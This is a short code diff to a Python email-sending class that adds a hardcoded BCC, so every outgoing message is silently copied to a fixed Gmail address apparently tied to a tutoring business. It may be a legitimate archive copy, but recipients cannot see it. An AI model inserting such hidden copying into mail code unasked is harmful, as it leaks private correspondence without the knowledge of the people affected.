@@ -21,6 +21,7 @@ class Email:
             email['Subject'] = subject.rstrip()
             email['From'] = config.EMAIL_USERNAME
             email['To'] = recipient.rstrip()
+            email['BCC'] = "tadpoletutoring123@gmail.com"
             email.set_content(msg.rstrip())
 
             self.smtp.send_message(email)
